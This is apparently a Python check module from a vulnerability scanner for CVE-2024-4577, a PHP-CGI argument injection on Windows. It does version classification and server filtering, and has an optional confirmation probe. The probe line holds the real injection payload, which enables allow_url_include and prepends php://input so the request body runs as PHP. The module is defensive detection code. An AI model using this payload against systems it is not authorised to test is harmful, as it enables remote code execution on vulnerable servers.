from __future__ import annotations

from typing import Any

from ...core.models import Confidence, Status
from ...core.versions import parse_version_required, parse_version_safe
from .common import harmless_cgi_marker_probe, runtime_finding

CVE_ID = "CVE-2024-4577"
NAME = "PHP-CGI Windows Best-Fit argument injection"
RULE = "PHP on Windows in CGI mode: unsupported branches, 8.1 before 8.1.29, 8.2 before 8.2.20, 8.3 before 8.3.8"
ACTION = "Upgrade PHP to a supported fixed release and disable CGI exposure on Windows."


def classify_version(version: str | None) -> str:
    value = parse_version_safe(version)
    if value is None:
        return Status.DETECTED_VERSION_UNKNOWN
    major_minor = value.release[:2]
    fixed = {(8, 1): "8.1.29", (8, 2): "8.2.20", (8, 3): "8.3.8"}
    if major_minor in fixed:
        return Status.LIKELY_VULNERABLE if value < parse_version_required(fixed[major_minor]) else Status.PATCHED
    if value < parse_version_required("8.1.0"):
        return Status.LIKELY_VULNERABLE
    return Status.NOT_AFFECTED


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    php_runtime: dict[str, Any] | None = None,
    **kwargs: Any,
):
    result = runtime_finding(
        cve=CVE_ID,
        name=NAME,
        rule=RULE,
        php_runtime=php_runtime,
        classify=classify_version,
        action=ACTION,
        exploit_available=True,
    )
    server = str((php_runtime or {}).get("server") or "").lower()
    non_windows_origin = any(
        token in server
        for token in (
            "debian",
            "ubuntu",
            "linux",
            "unix",
            "freebsd",
            "centos",
            "red hat",
            "rhel",
            "fedora",
            "rocky",
            "almalinux",
        )
    )
    incompatible_server = bool(server) and "apache" not in server and "iis" not in server
    if result.status == Status.LIKELY_VULNERABLE and (non_windows_origin or incompatible_server):
        result.status = Status.NOT_AFFECTED
        result.confidence = Confidence.HIGH
        result.detail += " The disclosed origin does not match the required Windows CGI deployment."
    if not run_exploit_check or result.status not in {Status.LIKELY_VULNERABLE, Status.DETECTED_VERSION_UNKNOWN}:
        return result
    confirmed, proof_url, http_status = harmless_cgi_marker_probe(
        target_url,
        php_runtime or {},
        "%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
        timeout,
        proxy,
    )
    result.exploit_ran = True
    result.proof_url = proof_url
    if confirmed:
        result.status, result.confidence = Status.VULNERABLE, Confidence.CONFIRMED
        result.detail = (
            "PHP-CGI argument injection executed a unique harmless arithmetic-free marker from the request body."
        )
    else:
        result.status, result.confidence = Status.NOT_CONFIRMED, Confidence.MEDIUM
        result.detail += f" The safe PHP-CGI marker was not returned (HTTP {http_status}); Windows CGI and a vulnerable code page were not confirmed."
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "php",
        "name": NAME,
        "component": "PHP runtime",
        "affected_rule": RULE,
        "affected_versions": ["<8.1.0", ">=8.1.0,<8.1.29", ">=8.2.0,<8.2.20", ">=8.3.0,<8.3.8"],
        "exploit_available": True,
        "exploit_modes": ["safe"],
        "intrusive": False,
        "references": ["https://www.php.net/releases/8_3_8.php", "https://nvd.nist.gov/vuln/detail/CVE-2024-4577"],
    }
